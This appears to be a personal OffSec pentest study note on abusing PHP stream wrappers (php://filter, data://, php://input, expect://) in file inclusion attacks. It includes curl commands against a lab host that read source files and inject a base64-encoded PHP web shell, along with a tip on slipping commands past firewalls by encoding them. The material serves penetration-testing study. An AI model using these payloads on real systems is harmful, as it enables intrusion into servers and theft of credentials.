---
tags:
  - Cyber
  - pentest_methods
  - web
  - OffSec
---
>[!IMPORTANT]
>This vulnerability will work only if parameter `allow_url_include` enable in the server


| **Wrapper**        | **Purpose**      | **Why Attackers Love It**                               |
| ------------------ | ---------------- | ------------------------------------------------------- |
| **`php://filter`** | Transform data   | Reading `config.php` or database credentials[^1].       |
| **`php://input`**  | Read POST data   | Getting RCE (Remote Code Execution) without a log file. |
| **`data://`**      | Inline data      | Quick execution of small payloads.                      |
| **`expect://`**    | Execute commands | Direct command execution (rarely enabled).              |

---
>[!INFO] `php://filter` FLAGS
>- `/convert.base64-encode`
>	Encoding parameter(In this example base64 encoder) We can use all [[Programming 1/Пентест/OffSec PEN/Tools/Decryption|decryption]] types
>- `/resource=`
>	Specify file stream for filtering


---
### Usage Examples

1. By using `php://filter` u can read file content without encoding( Also if this  content is encoded you need to add `convert.base64-encode` parameter)

> [!EXAMPLE] 
> `php://filter`
>```bash
>curl http://mountaindesserts.com/meteor/index.php?page=php://filter/
convert.base64-encode/resource=admin.php
>```

2. By using `data://` we can execute some commands like [[Local File Inclusion (LFI) And Log Poidoning|cmd]]

>[!HINT]
>If websites have any firewalls it wont pass your command(there is `console` key word even in the version with encrypted special characters)
>Better in this situations encode our command into base64 


>[!EXAMPLE]
>`data://`
>```bash
>1. echo -n '<?php echo system($_GET["cmd"]);?>' | base64
>2. 
>3. curl "http://mountaindesserts.com/meteor/index.php?page=data://text/
plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg=='&cmd=ls'"
>```



[^1]: реквизиты для входа
